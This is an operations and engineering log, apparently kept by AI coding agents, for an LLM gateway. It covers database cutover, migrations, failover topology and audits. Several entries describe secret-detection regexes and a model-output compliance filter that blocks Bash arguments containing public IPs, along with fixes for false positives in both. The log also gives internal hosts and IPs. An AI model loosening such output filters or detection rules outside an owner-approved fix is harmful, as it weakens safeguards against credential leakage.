   （本地 deploy-local 与生产 deploy-seamless 互抢），`shared build lock
   held` = 有别的部署在跑，判 pid 存活后等待。pgxmock 的 Scan 不支持
   **int 目的标，mock 夹具里可空列给 NULL。

# 追加：2026-10-14 凌晨 —— llm.itestu.cn 切主 211（docker），mac mini 降为边缘+热备

> 用户拍板：服务放一块（211 是整合机），mac mini 只作备用。并行会话已在
> 10-13 17:01 把公网链切到 211 边缘（252 conf + 211 nginx ns_llm_gateway_upstream），
> 但**数据没跟**：key 在 211 invalid、mesh 链仍指 mac mini——内外网脑裂。
> 本轮完成收尾。拓扑/坑/runbook 详见部署文档 §5.4。

## 完成的事（全部实测验证）

1. **数据同步**：mac mini pg18 全量 dump(177MB Fc) → 211 acc-pg17 新库
   （旧库改名 `llm_gateway_pre_cutover_20261014` 保留）。columnar 表落成 heap
   （目标无 pgcolumnar，功能无损）；**restore 后必须 ANALYZE**（否则 boot 20s
   预算超时→**静默降级 lite**，readyz 的 mode 字段是唯一肉眼判据）。
2. **MV 重复键 boot 阻塞链**：boot 幂等重建 `routing_analytics_7d_ukey` 撞
   23505 → postgres disabled → lite。根因=canonical GROUP BY 裸 `is_auto_request`
   + 源视图 17,473 行 NULL（S3 波 2 后不变量破）。两库已防御性重建
   （GROUP BY 对齐 COALESCE）；**正式修法（源视图+db.go 常量+migration
   三位一体）已登记待办，单修 migration 会被陈旧定义门无声回退**。
   `routing_audit_summary_7d` 同族暴露。
3. **SECRET_KEY 血缘**：api_keys.key_hash=HMAC(实例 SECRET_KEY,key)。211 用
   生产 SECRET_KEY 重建容器后 key 全绿；`gateway.secret` 持久化文件已更新；
   deploy-211-docker.sh 加了血缘警示。**换库必换对 SECRET**。
4. **configs 注入**：deploy-211-docker.sh 每次部署种子 configs/ 到宿主 bind
   （只读挂载 /app/configs）；镜像不含 configs 时回落内置脱敏集的行为差异已消除。
5. **mesh 链对齐**：mac caddy 443 上游=211(mesh IP):8781 主 + 本机 8782 备。
   三个 caddy 坑：**fail_duration 缺省=0 时 lb_policy first 永选主直接 502**；
   首笔回退要 `lb_retries`/`lb_try_duration`（caddy 2.10+；旧 try_duration
   加了**静默**启动失败）；**macOS 本地网络隐私**禁止 SSH 启的 caddy 拨 LAN IP
   （no route to host，curl 却正常）——必须走 mesh IP（utun 不受限）。
6. **252 加固**：恢复 upstream 用法（211:8000 主 + mac mini:8782 backup），
   211 整机宕时公网链仍有兜底。
7. **演练闭环**：停 211 → mesh 首笔回退+公网回退（真实调用经 mac mini 返回）
   → 恢复 → ~30s 自动回切主。四模型两链路 E2E 全绿。
8. setup-caddy.sh 新增 `DL_FALLBACK_UPSTREAM`（主备有序故障转移+主动健康检查）。

## 登记待办

- ★ `routing_analytics_source` NULL is_auto_request 不变量修复（+db.go
  `routingAnalyticsMVSQL` GROUP BY、migration、`routing_audit_summary_7d` 同查）
  ——正式修法三位一体，别单修 migration。
- 211 库号漂移（claim 不粘）与 UrsmlHealthyKeyReconciler 未启动两登记项仍在。
- 211 镜像未内嵌 configs（靠部署种子，重建镜像时留意）。
- 回切 mac mini 前必须反向 dump/restore（见 §5.4 runbook）。

---

# 追加：2026-10-14 01 时轮 —— mac-mini-removable 拓扑终态

> 用户要求：考虑 mac mini 整体下线的可能，完善 llm.itestu.cn 全链路。
> 结果：**mac mini 已完全可摘除**（mesh DNS、TLS、证书、公网链零依赖），
> 保留为容器级热备（在则自动兜底，摘则 dead backup 自动标 down）。
> 拓扑/回切手册/坑详见部署文档 §5.5。

1. **NetBird DNS 记录 → 192.168.31.211**（管理面在 252 `/opt/netbird/`，
   sqlite `zones`/`records` 表直改 + **必须 `docker restart netbird-management`**
   ——不重启则管理面内存仍是旧值、直改还会被下次持久化覆盖；并行会话曾
   预改未重启，险些踩坑）。客户端 lazy-sync 刷新，急用 `netbird down && up`。
   **选 LAN IP 不选 mesh IP**：MacBook→211 mesh IP 实测不通（lazy peer），
   LAN IP 通；离网 peer 走既有 lan-router-100 的 192.168.31.0/24 路由。
2. **211 nginx 增 :443 TLS 腿**（LE 证书，备份 bak-tls443-*）+ 每日 04:33
   证书同步 cron（211→252 受限密钥信任）。**`restrict=...` 带等号是非法
   authorized_keys 语法，整行被 sshd 静默丢弃**——必须 `restrict,...` 逗号式。
3. sync-public-cert.sh 参数化：DL_PUB_CRT/DL_PUB_KEY/RELOAD_HOOK（211 用
   nginx reload 钩子）。
4. 验证闭环：MacBook 解析/直连/四模型/公网链全绿；停 211 容器 → 直连自动
   回退 mac mini → 恢复自动回切。摘除 mac mini 无必须动作；211 整机宕的
   回切手册在 §5.5（改 netbird 记录指回 mac mini + 重启 management）。

> **r1027（2026-10-14 凌晨，提交 b10903bb09+14f73d4d98+3a714469c2，随本地
> 2619→2620 上线）**：三模型×两模式形态电池（66 形态位）+ raw-logs 逐条
> 甄别——五个表面供应商错误实为网关侧问题：① Bedrock
> `output_config.effort: Input should be`（reqprobe 词表三处断链：形态
> 不认+无引号冒号前缀名+上游命名空间名≠线体键，补 hints/正则/
> wireKeyAliases）；② gpt-6.1-sol tools+effort 的 suggest_mode 方向误判
> （responses 指令句现优先于 chat 提及）；③④ native responses 透传腿
> 不适配 chat 风格参数（`moved to reasoning.effort/text.format/
> max_output_tokens`×3 + logprobs 系删——AdaptChatParamsToResponsesWire，
> native+reactive 腿同治，显式目标形态不覆盖）；⑤ json-word 契约 400
> 按 transient 冷却节点 → 一次客户端错级联数分钟 no_candidate（双分类器
> 同臂归 client_bug）。格式错误表闭环：request-anomalies 新增 5 条记录
> 全 recovered 可见。66/66 全绿、级联抑制实测。**多会话事故**：stash
> push --staged 往返丢暂存——commit 前必须重验 `git diff --cached --stat`。
> 详见 `docs/audit/2026-10-14-r1027-三模型形态甄别与格式错误表闭环.md`。

---

# 追加：2026-10-14 r1028 —— claude 流式轮次「reason=unknown」= 策略拦截静默吞流四连修

> 用户报告 ZCode 经 154 访问 claude-sonnet-5-5「经常操作过程中中断」
> （`Turn execution failed … reason=unknown retryable=false`）。
> 提交 `74d9d8748`，随 **154=2600-74d9d874** 上线终验通过。
> 明细与判据：`docs/audit/2026-10-14-r1028-流式策略拦截静默吞流四连修.md`。

## 一句话根因

output compliance 流式持帧后 lane 检查命中（r1013 契约：Bash 参数含公网
IP 字面量）是**合法策略拦截**，但 survival 路径从未接线 R25-V 治理终态
机制 + block 决策点零日志 + chat 终态帧无 code + 六处桥的 DrainPending
死断言——四缺陷叠加让拦截呈现为「客户端 keepalive-only + 网关 success=true
+ 零日志」。154 真机 E2E 决定性复现（临时 api_keys 行 + HMAC 配方）。

## 修复四件

1. survival 分支显式 `finish()` + `OutputPolicyBlocked()` → `outputGovernanceTerminal`（R25-V 终于覆盖 survival；audit 改记
    failure/output_policy_blocked；消费点 nil 安全）；
2. stream_compliance 四处 block 决策点补 Warn（lane/event/comment/重写拒绝）；
3. chat 终态帧补 `"code":"output_policy_blocked"`（responses 腿对齐）；
4. `drainGateWriterPending`（Unwrap 循环）替换六处桥的死断言——R-vapeur3
    的 [DONE] 排水在 survival 路径自上线起就是死代码（`w.(*GateWriter)` 在
    wrapAttemptWriter 返回外层包装时恒失败）。

判据 `r1028_swallowed_stream_repro_test.go`（7 用例）+ M-③/M-④ 变异红；
streaming 全包 150s 绿。154 终验：拦截请求三件套全绿（终态带 code、日志
带 lane 上下文、session_turns_hot 记 success=f），正常流 45KB 无回归。

## 判据纪律第 10 条（新增）

**流式 HTTP 夹具的「通过」可能是空洞的**：最终 wire 字符串无法区分「逐帧
透传」与「持帧后终态一次性释放」——本缺陷复现两虚假绿，靠 writer 链中段
加逐帧探针才现形。流式判据要么断言时序（分批读），要么链中加计数探针。

## 登记不修（owner 拍板域）

- r1013 契约本身：模型在 Bash 参数写公网 IP（含版本四元组、用户自有
  服务器 IP 回显）仍整轮阻断——修复只让阻断可见可归类。若要「会话请求
  侧出现过的 IP 豁免」（r1024 原理、来源改请求侧），动 guard 的 mandatory
  语义，另立轮次。
- chain.go:196 持帧者类型断言对装饰器不鲁棒（包装层会让释放载荷静默
  丢弃，本地实证）；当前生产链无包装层，加装饰器前必读该注释。
- 杂音：治理阻断时 slog 仍会打「audit: request completed success:true」
  （audit hook sink 另一事件源）；权威判定以 session_turns_hot 为准。

## 本轮实操注记

- 154 真机 E2E 手法：临时 api_keys 行 + `HashAPIKey(SECRET_KEY, raw)` HMAC
  配方（事后 DELETE）；vapeur 对 named tool_choice 返回 400（`tool_choice:
  type "tool" and "any" are not supported`），复现夹具别用强制工具。
- 编号撞车实录：并行会话同日已发布 r1027（参数形态甄别），本缺陷顺延
  r1028——共享编号空间，提交前搜 audit 目录。

---

# 追加：2026-10-14 r1028 —— `=== pwd ===` 分节装饰误触发密钥规则（三份正则副本同修）

> 用户报告：grok-4.6 工具调用 `output_policy_blocked reason=unknown`。
> 取证：raw_data（LLM_GATEWAY_RAW_LOG_DIR=/var/log/llm-gateway-go/raw_data）
> 帧重建——被拦的是 1279 字节**纯 git 检查命令**，触发行 `echo '=== pwd ==='`。
> 详见 `docs/audit/2026-10-14-models只列可路由模型-r1027.md` 追加节。

1. **同一误伤家族、三份正则副本、两条拦截路径**：①
   `configs/sensitive_patterns.yaml` secret.password + ② Go fallback
   `operational_patterns.go` credentialValuePattern/accountValuePattern ——
   值字符类放行纯 `=` 串，`pwd ===` → 「pwd = 赋值 ==」→ ScopeEgress 流式
   lane 硬拦（issues=0）；③ `domains/outputcompliance/checker.go`
   detectSecrets（第二套 DB 合规引擎，无 CheckField，共享拦截器整段回退
   Check）`\S+` 吃掉 `==` → 工具 lane 改写保护把 redact 升级成整流
   block（403 主拦截者）。修复=三处统一「未加引号的值首字符不得为 `=`，
   引号值走引号分支」（DB 引擎为 `("[^"]*"|'[^']*'|[^=\s'"][^\s]*)`——
   第一版只排 `=` 时 `pwd ='` 尾引号仍命中，判据抓到后补齐）。
2. 判据：`security/sanitize/r1028_secret_value_equals_decoration_test.go`
   （生产 1279B 原文夹具 + sanitize 双副本正则断言 + redact 侧配对）+
   `domains/outputcompliance/r1028_dbengine_pwd_decoration_test.go`。
   变异三方向（yaml/Go/DB 引擎各自回退）全部红在正确断言。
3. 部署：154=**2606**、245=**2607**。线上探针：装饰形态 PASS 逐字透传
   （修复前 403）；真实口令按租户策略脱敏；公网 IP 契约不变。
4. 量具坑：**被 compliance 拦下的 lane 不落 session_bodies**——被拦内容唯一
   取证源是 raw_data 三段帧（client_request/upstream_request/
   upstream_response，base64）；`grep -a` 替代 strings（CJK 断行漏报）；
   进程真实 yaml 路径=systemd WorkingDirectory 下的 configs/（与 release
   内副本是两份，都要 md5）；共享构建锁被本地 deploy 占用时生产 deploy
   报 `shared build lock held` 直接失败（判 pid 等待）。
5. **开放项**：252 宿主 load 33+（跑飞的 `grep -rl cutover-backup` 自
   10-13 起 + python backfill + kswapd0），导致一次部署 DB 就绪失败自动
   回滚——ops 催办；outputcompliance DB 引擎补 CheckField（label 感知，
   避免整段回退丢工具上下文）登记不修。

# 追加：2026-10-14 S4 退役改名轮 —— request_logs 族 `_` 前缀待删除标志（本地已上线）

> 用户目标：审计双写转换收尾——写入关停核验、MV/API 读源核验、性能核验、
> **request_logs 族改名为 `_` 前缀作为待删除标志**、SQL 变更进部署序列、
> 本地重部署 + 指定 key 多轮模型请求 + 浏览器逐页验证（>2s 查慢因），提交推送。
> 提交见本轮 git log；明细：`docs/audit/2026-10-14-s4-退役改名轮-request_logs族下划线前缀.md`。

## 本轮之前的合并处置

本地曾有 3 个未推送的 S3 波 4 提交，与远端并行会话的 S4 波 4 同域。
合并 origin/main（52 提交）时**以远端为准**（生产已验证 + 已推进到生产翻转），
本地仅保留 data_lifecycle.go 趋势端点的跨族 + 冻结点切分实现（远端版本 trend
仍 v1-only；会话腿改 session_bodies_unified 单腿过两面门）。部署 2623 验证合并态。

## 迁移 860（本轮核心交付，本地 2624 已应用）

- **改名**：5 表（request_logs/_hot/_bodies/_bodies_hot/_archive）+ 序列 → `_` 前缀。
  视图名**不动**（兼容读层，按 OID 自动跟随，`pg_get_viewdef` 已显示新名）；
  分区子表/索引名不动（经父表继承删除标志）；函数名不动（Go 调度契约）。
- **每条改名是 EXECUTE 字面量里的完整静态语句**——admin 侧 liveRelations 对
  sql/migrations 做**文本重放**，动态 format('%I') 对它不可见（承重设计）。
- **26 个 plpgsql 函数体**经 pg_get_functiondef 往返 + 词边界正则改写；
  后置断言：改写后 public schema 零残留旧名引用（实测 0）。
- **down 迁移**提供（仅在族 DROP 前有效）。五点 installer 同步 + 通道腿 + tsv
  （255→256）+ db-changelog（SHA 已记）全数完成，`apply-db-revision-sequence_test` rc=0。
- **不建兼容视图**（三明治方案否决）：改名的目的就是让漏网读方响亮失败。
- **部署语义**：boot 先迁移后视图自愈，单部署原子；蓝绿窗内旧实例读会短暂
  报错（写已停无竞争）。生产未应用——下次生产部署经启动序列自动带上。

## 代码清扫（三轮 + 一次回退，全部真库/测试验证）

1. 基表 token：`(?<![A-Za-z0-9_/])TOKEN(?![A-Za-z0-9_.])`——lookbehind 拒
   函数名/路径串，lookahead 拒视图名/动态分区前缀/路径后缀；点号前置放行
   （public. 限定）。295 非测试 + 228 测试 + 92 个 scripts/ 运维脚本。
2. **列限定词补扫（真缺陷修复）**：第一轮的点号后置保护漏掉 SQL 列限定词
   `request_logs_hot.列名`（telemetry client.go 41 处——UPDATE 目标已换新名而
   WHERE 限定词还是旧名 = 运行时 missing FROM-clause entry）。130 文件 303 处，
   扩展名白名单守卫（`.ts` 命中经查全是 SQL 列，无路径冲突）。
3. **SQLite 平面回退**：bg/lite_retention_worker.go 与 cmd/gateway/
   lite_telemetry_sink.go 是 lite 模式 SQLite 单文件库（表名不随 PG 860 改），
   误扫后回退；判据侧本就把 SQLite 列为另一存储面。
4. 判据/门同步 17 处（token 闭集与正则一律「两代物理名并存」）；顺手收口
   origin 既存红 1 条（sqlreadguard 白名单 quality_correlations 滞留，
   pristine worktree 实锤）。

## partition_manager 生命周期挂停写门

`v1LifecycleRetired()`（= !RequestLogsWriteEnabled()，热加载）：ensure/promote
滤掉 v1 族四条、archiveOldRequestLogs 早退；**保留** retention DELETE
（drop_old_request_logs_bodies_partitions——唯一真正缩小待删负载的作业）。
判据 `TestV1LifecycleSpecsStandDownWhenWritesStopped`（count==N 双向），
变异验证：门恒 false 时 4 断言红在正确位置。

## 本地验证（2624，全部实测）

- 迁移落地：5 表 + 序列全部前缀名、旧名 0 残留；canonical 视图 45,369 行
  dup=0 照常；函数体残留 0。
- **模型多轮**（用户指定 key）：glm-5.3-flash ×5 轮（含多轮会话）、minimax-m2.7、
  deepseek-v4-flash 全通；session_turns_hot 2408 实时推进、最近 20 轮 20/20 有正文、
  **_request_logs_hot 恒 0**。⚠ 该 key 行曾 enabled=false 且哈希属旧密钥世代
  （本地库已重算 + 启用）。
- **浏览器 34 页全测**：实际加载 100-300ms，无一超 2s；数据页（request-logs/
  turns/compression/data-lifecycle/usage/probe-health/models 2896 个/keys 151 把）
  均带真实数据渲染；/maintain 显示占位是设计内（独立 nginx SPA）。
- **API 直测**：族内端点全部 200 且亚秒（sessions 9ms、compression 124ms、
  data-lifecycle/stats 877ms、dashboard 2ms、turns 128ms）。

## 量具与既存红登记

- **openssl 输出格式坑**：新版 `openssl dgst` 不再打印 `(stdin)=` 前缀，
  `awk '{print $2}'` 取到空串——LIKE '' 的假阳性骗过一次核对。哈希比对用
  `$NF` 并对空值显式失败。
- **cgo SIGSEGV / tapi 既存**（pristine 实锤）：SDK27 链接坏、SDK26.5 下
  cmd/gateway cgo 段错误、lite-SQLite 子集需 CGO、scripts/ursmcheck 的
  `date -Is`（252 目标脚本在 macOS 测试机不兼容）——四类环境红，登记不修。
- 测试清扫误伤形态（本轮 6 处）：对「扫描器即测试」的文件做机械替换时，
  **字符类/正则元字符邻接的 token 是盲区**（双前缀 `_?_request_logs`、
  `(_request_logs[a-z...` 等）——清扫后必须跑全部门并逐条核对失败信息。

## 遗留（下轮/owner）

1. 生产 245/154/252/211 未应用 860；下次部署自动带上（生产蓝绿窗按维护窗执行）。
2. `TestV1BodiesReadersAreAssessed` 总体从 27 文件/39 处降到 26 文件/36 处
   （第二片口径）——DROP 前的 owner 四象限复核仍是前置。
3. ensure_request_logs_partition 若因回滚写路径被重新启用，会建出旧命名的
   新子表（功能正确，命名混杂，登记不修）。

> **2026-10-14 补充验证轮（completion verifier 缺口收口，随 861 提交）**：
> ① 浏览器累计 93 次访问覆盖全仓 ~85 条声明路由（含参数化详情页，真库 id），
> 实际加载 100-300ms 零超时；豁免登记：/maintain（独立 nginx SPA）、
> /customer/* 版本目录（需中心注册服务）、支付渠道页（外部）、approvals/1
> （空表空态）。② 指定 7 模型 × 全部 5 条样例提示词（ping/say OK/合并推送/
> 批判审计/磁盘清理）全部实测——4 个补测模型全 200 带内容；写路径终验
> session_turns_hot 2,408→2,612、`_request_logs_hot` 恒 0、canonical 同步
> +204。⚠ 本地 key 曾有 rate_limit_tpm=3 测试残留（真响应即 429 连坐），
> 已清 NULL。③ 444 个注册 API 路由 GET 全扫：234×2xx/100×405/62×400/
> 33×404/9×5xx；4 个 503 为设计内未配置态，其余 5 个里修掉三个真缺陷
> （**迁移 861** candidate 视图显式列清单重建吸收 session_id——SELECT *
> 视图不跟随后续 ALTER 且两表列序已分叉；user_profile NULL 属主过滤；
> session-audit/export rows 闭包内消费——旧形态连接带未关闭 rows 归还池
> 即 conn busy），随 2626 部署验证全 200。**登记**：domain/ 手动迁移语料
> （如 032 触发器体）仍指旧表名，860 后重放需同族改名清扫（下轮）。
---

# 追加：2026-10-14 供应商返回自动调策审计 + 「网关智能体」必要性裁决

> 审计 r1020→r1028 八轮修复后确认：供应商返回→自动调策→记录复用链已由
> 五层确定性引擎闭环（L0 paramguard/reasoncap → L1 paramreg/线格式适配 →
> L2 errorsx 分类 → L3 reqprobe 反应+24h 学习 → L4 action_policy），
> **热路径 LLM 智能体裁决为无必要**（+秒级延迟/计费/不可判据化 vs 毫秒级
> 零成本全链判据化）；智能体正确位置=对格式错误表 upstream_error 桶做
> **离线**模式挖掘（登记待 owner）。活网关实测：grok+thinking+enable_thinking
> 一次 200（`applying learned param strips` 前置剥参实证），格式错误表
> 32 条、#32 gpt-6.1-sol mode_mismatch 4/4 recovered（r1027 方向甄别活证据）。
> 详见 `docs/audit/2026-10-14-供应商返回自动调策审计与网关智能体裁决.md`。
> 注意：宽容上游（glm 收未知参数）不触发反应层是零成本正路，勿当缺陷。

> **r1029（2026-10-14 凌晨，提交 725372743 + 审计文档 b20badb350，随本地
> 2627 上线）**：日志例行扫描发现 `SESSION_FORBIDDEN`×4051 /
> `auto_summary: transient error`×2040——ErrSessionExpired 落进
> 「store fault → 503」分支且响应体误用 FORBIDDEN 文案，auto_summary
> 内部回环（gs_/gt_ 分支会话 TTL 短）对确定性终态反复重试。修复=
> `sessionAbsentErr`（NotFound‖Expired 同归 absent 家族，gw_ 认领/
> 分支 id 保留）+ chat 腿 store-fault 503 改写 SESSION_STORE_UNAVAILABLE
> （8 locale 新键）。**生产 wiring 实测**：getter 适配器不暴露
> EnsureV2WithID，过期会话走 no-ensurer 分支换新系统 id——活体实验
> （Redis 种 2h 前过期 hash + 异主 api_key_id）旧代码必 503、2627 实测
> 200。判据 r1029_session_expired_test 三层协议全链；M1 首次变异是无操作
> （perl 模式失配）——**变异后必须 sed 读回实际文件**，不能只看退出码。
> 详见 `docs/audit/2026-10-14-r1029-会话过期误判store-fault与auto_summary重试循环.md`。

---

# 追加：2026-10-14 magpie P0 四项落地（提交 feb712b4b，本地 2608 E2E 全过）

> 用户指令：按 `docs/research/2026-10-14-magpie对比与优化方案.md` 学习 magpie，
> 4 并行子代理实现 P0-1~P0-4 → 提交推送（50df72e1e，含并行会话 8 提交 merge）
> → 本地部署 2608 → E2E 验证。明细与判据矩阵：
> `docs/audit/2026-10-14-magpie-p0四项落地与本地E2E验证.md`。

1. **P0-1** 动态可选字段剔除记忆：errorsx.RefusedOptionalParam（400/422 指名
   参数提取，pydantic loc/\\uXXXX 变体）+ internal/paramrefusal（(provider,
   model, wire) 24h TTL 记忆 + 黑名单永不剔）+ executor 三 choke point 主动
   剔除 + 同候选重试一次。**与 reqprobe 分工**：reqprobe 骨架字段（如
   reasoning_effort）由 reqprobe 先抢，paramrefusal 兜词形/未知字段——E2E
   用 pydantic 422 + service_tier 逼出本尊，`paramrefusal retry` 日志在场、
   第二次执行 1 hit（记忆发前剔除）。
2. **P0-2** survival 交互 deadline 5h→240s（config 三处 + coordinator），
   settings_kv 热键 `survival.interactive_deadline_seconds`（每 Run 热读），
   deadline 终端帧带 attempts/kinds/earliest_recovery 摘要（三协议，code/
   reason 契约不变）。生产未部署，本地 survival 分支未启用（arm 行不打）。
3. **P0-3** 断流原地续问：上游 chat SSE 无终态且已发正文 → 同候选 assistant
   prefill 重发一次（GetBody 重绑防重放），帧无缝拼接（role 抑制、双预算、
   kill 键 `survival.stream_continuation_enabled` 默认 true 热加载）。E2E：
   mock 断流 → 61ms 后第二请求尾部=assistant "one two three" → 客户端完整
   文本单终态。桥接腿（anthropic/responses 客户端协议）未接 hook（登记）。
4. **P0-4** rest 分级：errorsx.ParseQuotaResetAt/GradeQuotaRest/IsCreditExhausted/
   ModelScopedRejection + breaker.RecordFailureWithReset（对齐 resetsAt，
   clamp 30s-2h）/RecordModelScopedFailure + **executor_nodehealth
   EffectRecordCircuitFailure 臂接线**（主会话补，判据 executor_nodehealth_
   p04_wiring_test.go，M-A/M-B 变异红）。E2E：429 quota 词形 → `circuit
   quota cooling aligned`（599344ms 精确对齐）→ 冷却期 0.13s 快速失败零上游
   命中。**rate 词形分类为 rate_limit 不对齐（设计内）**。
5. **本地栈坑（新）**：~/sdk 工具链又被清（brew go1.27.1/bash5.3.9 替身已装）；
   本地库账本 851 但 model_offers 视图缺 682 三列（候选查询炸，sync 型库
   信列不信账本）；凭据密文必须按 `FernetKeyFromSecret(SECRET_KEY,
   LLM_GATEWAY_CREDENTIAL_ENCRYPTION_KEY)` 显式链加密（run/*.env 两者都在，
   explicit 优先）；api_keys.application_id 必须真实存在（=0 被 keystore
   JOIN 丢弃全员 401）；新插 key 要 touch last_used_at 才进 delta 同步窗。
6. **本地 E2E mock 栈**：/tmp/p0_mock_server.py（五模式可控上游）+ DB provider
   9010 seed（详见审计文档 §二），后续轮次可复用；API key id=2 存于 api_keys。

---

# 追加：2026-10-14 r1030 —— 24h 修正任务审计与完善轮

> 审计明细：`docs/audit/2026-10-14-r1030-24h修正任务审计与完善.md`。
> 本轮**未部署**（无授权）；结论来自本机编译、判据、隔离 PG18 实测。
> 24h 内 main 约 80 提交，编译与核心包单测全绿。命中 **2 真缺陷 + 2 缺门**，
> 全部当场修复、补判据、做过变异验证；另 2 条审计线结论为**干净**（负面结论也记，
> 免得下轮重复取证）。

## 四项发现与修复

1. **D1（真缺陷）迁移 862 的守卫腿被无守卫 COMMENT 击穿**。建腿有
   `to_regclass('public._request_logs')` 守卫，末尾两条 `COMMENT ON INDEX` 是顶格无条件的。
   隔离 PG18 实测：该族缺席时整文件在 **COMMIT 之后**以
   `ERROR: relation "idx_request_logs_ts" does not exist`（42P01）**退出码 3** 收场。
   `installer/internal/dbinit/runner.go` 的 `applySQL` 走
   `psql -v ON_ERROR_STOP=1` 且**只按退出码记账** ⇒ 该迁移永不 applied、每次启动重放
   同样失败（永久迁移卡点）；又因 `IF NOT EXISTS` 已命中，重放不重复建索引、不改坏库——
   **这正是它能长期潜伏的原因：索引在、账不在**。命中人群是迁移注释自己点名的
   「736 预应用（旧名）环境」与该族从未建起的新装库。修法：两条 COMMENT 与创建腿同守卫。
2. **D2（台账缺口）862 未登记 `docs/db-changelog.md`**（861 及 855–860 都有）。按
   **627/856 先例补新旧双指纹**：任一匹配即过，兼容已把旧字节自记账的环境。
3. **D3（缺门）installer embed 的字节门只有 627-630/635 五条显式 cases**——正是
   「已完成」第 6 条那族复发源（851 半同步、849/850 全漏、845-851 通道腿整段漏登）。
   新建通用门：embed×canonical **逐字节**全量比对（实测 357 件）+ **849 起每条
   canonical 必须有 embed 副本**（14 条）。反方向只对 849 起设门，因为 embeddata 是
   精选子集（660 嵌 359），全量「必须嵌」会误报。
4. **D4（缺门）`web/public` 根资产豁免只有注释里的维护契约**。12e94a240 补了 7 个
   public 根资产 + `/index.html`，提交信息里写「今后新增必须同步登记」——**没有任何门
   盯着目录与清单一致**，而它修的正是这个缺陷本身，且从 2026-07-10 起三个月没人记。
   新建三腿门：① index.html 运行期引用的 public 根文件必须匿名可达（正向，3 条）；
   ② public 根每个文件必须**有名字地**被处置——进 `ExactPaths` 或登记为构建期产物并写
   理由（反向，当前仅 `menu-config.json`/`version.json`，二者浏览器运行期**均不请求**，
   已 grep 全仓确认，加进豁免反是不必要的暴露面）；③ 登记为构建期产物的文件一旦被
   index.html 真引用，必须挪进 `ExactPaths`。清单直接从
   `NewAuthMiddleware("test-key").bypass.ExactPaths` 取，**不在测试里再抄一份**。

## 判据与变异验证

- D1：静态 `Test862CommentsAreGuardedLikeTheirCreateLegs`（顶格 COMMENT 即红）+
  `Test862EmbeddedCopyMatchesCanonical`；**真库**判据
  `TestMigration862AbsentRequestLogsFamilyStillApplies` /
  `TestMigration862BothFamiliesBuildsAndCommentsBothLegs`
  （`-tags=integration` + `TEST_PG_URL`，自建一次性库，执行口径对齐 applySQL）。
  **M1**（改回顶格 COMMENT）→ 静态双红 + 真库红在 42P01，**与原缺陷同一错误码**。
- D3：**M2**（只改 embed 副本）→ 单条判据与通用门双红。
- D4：**M3**（摘掉 `/favicon.png`）→ 正向腿红 status=401 + 反向腿红；**M4**（往 public
  根丢未表态文件）→ 反向腿红并点名；**M5**（index.html 真引用 menu-config.json）→
  构建期表失效检查红。三个变异精准命中，探针文件已回收站。

## 两条干净线（负面结论，防重复取证）

- **deploy 脚本清理（ecbebfa55 删 33 件）**：全仓扫描存活引用，命中全在文档/CHANGELOG
  历史叙述；唯一 4 处疑似活引用逐条核实为**注释或无关字符串**
  （`apply-db-revision-sequence_test.sh:74` 注释里点名的历史调用方；
  `deploy_rollback_test.sh:301` 是 `missing-version rollback` 子串；
  `db252_tunnel_test.sh:166` 指向仍存在的 `scripts/partition/bodies-hot-repack-rollback.sh`；
  `deploy_sops_test.sh:54` 提到 `deploy_cli_test.sh:55` 这个**行号**）。**零残留。**
- **S4 改名（570b6d026，676 文件）**：Go 侧裸表名引用逐处核过——非测试代码只剩
  SQLite 存储（`storage/sqlite/`、`bg/lite_retention_worker.go`，与 PG 改名无关），
  其余全是历史迁移测试夹具与两份 admin 停写分类台账（引的是 canonical 视图，
  按 860 设计不改名）。**读侧无残留裸引用。**

## 判据纪律第 11 条（新增）

**别让管道把编译/测试的失败吞成成功**：`go build ./... | tail -30; echo "BUILD_RC=$?"`
打印的是 `tail` 的退出码（恒 0）——本轮首次即踩到：输出满屏 clang 报错，`BUILD_RC=0`
照样打出来，差点误判为「编译通过」。判定编译结果**不得经管道**：先重定向到文件再看
`$?`，或 `set -o pipefail`；`go test | tail` 同理要读 `${PIPESTATUS[0]}`。

## 并行会话纪律（本轮实证）

`-2` checkout 出现未提交 WIP（`internal/ir/parse_responses.go`、
`security/sanitize/{placeholder_loose,smart_sani_guard}.go` + 两个 `r1030_*_test.go`），
**mtime 距当时仅数分钟** ⇒ 正在被别的会话写。处置：**只读取证（查 mtime/diffstat），
不碰不提交不删**；随后该会话自行提交推送为 `ec9d2f3f0`。自己的改动集与它**零文件
重叠**（`git diff --name-only` 核过），故可带着未提交改动安全 `merge --ff-only`。
分支清理只删**远端已合并陈旧分支**，**不摘本地 worktree**。

## 分支面（两种窗口口径都报）

- 严格 24h 窗口、≥1h 未活动：**0 条**（窗口内除 main 无任何分支）。
- 宽窗口（沿用上轮 [1h,48h]）：远端 `feat/deploy-211-docker`（68b1de396）、
  `s3-wave2-readsource`（4abbe24e6）——删前逐条 `merge-base --is-ancestor` 确认已并入
  main，`git push --delete` **已执行**。
- `-2` 的 4 条本地分支全部已并入 main（`ahead=0`）但**本轮不动**（两条挂在 worktree 上，
  且该 checkout 有活跃并行会话）。远端 3 条九月未合并分支维持留置（窗口外、独有内容）。

## 下一轮提示词（2026-10-14 r1030 轮更新）

1. ~~**D1 待部署授权**~~ **已上线，三环境皆含修复（2026-10-15 17:5x 核验）**：
   先做的部署前取证（2026-10-14 15:2x，只读）：`to_regclass('public._request_logs')`
   在**每一个可达环境**都非 NULL——154 / 245 / 252 共用的生产库（`172.16.2.210:5432/
   llm_gateway`，其实跑在 252 的 podman 容器里）、211 的 PG17（`acc-pg17`）、本机
   host-first（54318）全部 `prefixed=_request_logs | idx=idx_request_logs_ts`；
   生产库台账已有 `860/861/862`（applied_at 2026-10-14 13:15:31~32，两台同库故同戳）。
   按 S4 §6.6 的口径，这 5 个环境都不会被 D1 的缺陷咬到——862 的无守卫 COMMENT 腿
   在族在场时必然有索引可注释。
   **当前生产实况**（`version.json` + `readlink current` + readyz 三处对齐）：
   - 154 = `2.5.8-6dc0ad45-20261015-2651`，活跃端口 **8782**（已从 8781 漂过来），readyz 200
   - 245 = `2.5.8-6dc0ad45-20261015-2650`，活跃端口 **8781**（已从 8782 漂过来），readyz 200
   - 211 = `2.5.8-f280c9dc-20261014-2636`（docker），readyz 200，`to_regclass=_request_logs`
   `git merge-base --is-ancestor 50eb3bb88 <构建提交>` 对三个构建提交**全部为真**
   ⇒ D1 修复已在三台生产二进制里。**本轮未执行任何部署**（详见下方教训）。
   ★ **新教训（授权会过期，执行前必须以当前状态复核前提）**：owner 批准「部署
   154+245+211」之后，会话间隔一天多，期间**并行会话已把三台都部署到含修复的提交**。
